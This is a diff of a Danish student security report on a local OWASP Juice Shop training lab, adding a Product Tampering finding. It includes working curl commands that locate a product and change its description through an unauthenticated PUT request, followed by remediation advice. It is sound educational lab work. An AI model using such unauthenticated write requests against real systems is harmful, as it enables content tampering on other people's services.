@@ -1,7 +1,7 @@
 # Opgave 5 – OWASP Juice Shop
 
 **Specialisterne Academy · 30. oktober 2026 (seneste statuskontrol)**  
-**Status:** I gang – **26/186 deludfordringer** ifølge Juice Shop-eksporten fra 30. oktober 2026: **14 hacking-challenges + 6 Find It + 6 Fix It**. Samme progressionskoder som i den seneste eksport 28. oktober. Tidligere optælling på 18 var ufuldstændig.
+**Status:** Seneste JSON-eksport fra 30. oktober 2026 viser **26/186 deludfordringer** (**14 hacking-challenges + 6 Find It + 6 Fix It**). **Product Tampering** blev løst efter eksporten; ny samlet total er endnu ikke verificeret. Tidligere optælling på 18 var ufuldstændig.
 
 ## Formål
 
@@ -248,6 +248,52 @@ Et almindeligt klientkald modtog interne detaljer om databasen, ORM-frameworket 
 
 ---
 
+## Sikkerhedsfund 4 – Product Tampering / Broken Access Control
+
+**Kategori:** Broken Access Control (manglende autorisationskontrol på API-niveau)  
+**Status:** Bekræftet løst **30. oktober 2026**, efter den seneste JSON-eksport. Ny samlet challenge-total er ikke kontrolleret med et nyt Score Board-screenshot eller en ny eksport.
+
+### Første forsøg – ændring af browserens DOM
+
+Jeg åbnede produktet **OWASP SSL Advanced Forensic Tool (O-Saft)**, fandt linket i Firefox DevTools' Inspektør og ændrede `href` direkte til `https://owasp.slack.com`. Det ændrede **kun den lokale DOM i browseren**. Challenge-beskrivelsen sagde blot, at linket skulle ændres; den specificerede ikke, at ændringen skulle gemmes server-side og overleve en genindlæsning. Derfor gav dette forsøg ingen challenge-markering.
+
+### Verificeret PoC – ændring af produktet via API
+
+Fra Ubuntu-terminalen blev produkt-ID'et identificeret ved at søge i produkt-API'ets JSON-resultat:
+
+```bash
+curl -s http://127.0.0.1:3000/api/Products/ | \
+python3 -c 'import json,sys; print(next(p["id"] for p in json.load(sys.stdin)["data"] if "O-Saft" in p["name"]))'
+# 9
+```
+
+Derefter blev produktbeskrivelsen opdateret **uden login eller Authorization-header**:
+
+```bash
+curl -i -X PUT http://127.0.0.1:3000/api/Products/9 \
+  -H "Content-Type: application/json" \
+  -d '{"description":"<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}'
+```
+
+**Faktisk svar:**
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+```
+
+Serverens JSON indeholdt `"status":"success"`, `"id":9`, den nye `description` og `"updatedAt":"2026-10-30T09:16:33.136Z"`. Juice Shop viste succesnotifikationen for **Product Tampering** (tre ens notifikationer fra samme challenge; ikke tre separate challenges).
+
+### Hvorfor er det en sårbarhed?
+
+Serverens API accepterede en skriveoperation, som ændrede et produkts gemte indhold, fra en **ikke-autentificeret klient**. Forskellen fra den oprindelige DevTools-ændring er, at en API-`PUT` ændrer tilstanden på serveren og dermed påvirker andre brugere. Det kan misbruges til manipulation af indhold, eksempelvis til at indsætte uønskede links.
+
+Den viste kildekode i Juice Shop har ikke tilstrækkelig beskyttelse af `PUT /api/Products/:id`; en kommenteret autorisationsregel i `server.ts` illustrerer den manglende adgangskontrol. Den sårbare endpoint-adfærd er direkte verificeret med `HTTP 200` og den ændrede produktbeskrivelse.
+
+**Afhjælpning:** Kræv autentifikation og eksplicit server-side autorisation for produktændringer; begræns skriveadgang til relevante administrative roller, og tilføj regressionstests, hvor en anonym `PUT` skal afvises (fx `401 Unauthorized` eller `403 Forbidden`). Desuden bør administrative ændringer logges.
+
+---
+
 ## Øvrige undersøgelser og læringspunkter
 
 ### Recycling: client-side kontrol vs. server-side validering
@@ -323,6 +369,7 @@ Arbejdsgang:
 | P1 | Usikre sikkerhedsspørgsmål | Erstat med kortlivet, engangs-password-reset-link og rate limiting | OSINT-svar alene kan ikke nulstille konto |
 | P2 | Tom registrering | Server-side schema-validering og databaseconstraints | Tomme/udeladte felter giver 4xx, ikke 201 |
 | P3 | Fejllækage | Central fejlhåndtering og sikre responses | Constraint-fejl giver fx 409 uden stack trace |
+| P2 | Product Tampering – anonym produktændring | Autentifikation og rollebaseret autorisation på `PUT /api/Products/:id` | Anonym `PUT` afvises med 401/403, produktindhold uændret |
 | P4 | Manglende URL-kodning | Korrekt encoding af sti-/filnavnskomponenter | Fotoindhold med `#` indlæses normalt |
 
 Prioriteringen er en kvalitativ vurdering til undervisningsbrug, ikke en formel CVSS-beregning.
@@ -339,7 +386,7 @@ Prioriteringen er en kvalitativ vurdering til undervisningsbrug, ikke en formel 
 
 - [x] Lokal, isoleret Juice Shop i Docker.
 - [x] Undersøgelse via browser, DevTools og direkte HTTP-requests.
-- [x] Minimum tre særskilte sårbarhedsfund med observerede PoC-resultater.
+- [x] Fire særskilte sårbarhedsfund med observerede PoC-resultater, herunder Product Tampering fra 30. oktober.
 - [x] Konkrete forslag til afhjælpning.
 - [x] Flere OSINT- og forensics-øvelser gennemført.
 - [ ] Gennemgå den faktiske kildekode og angiv konkrete filer/linjer for de tre hovedfund.
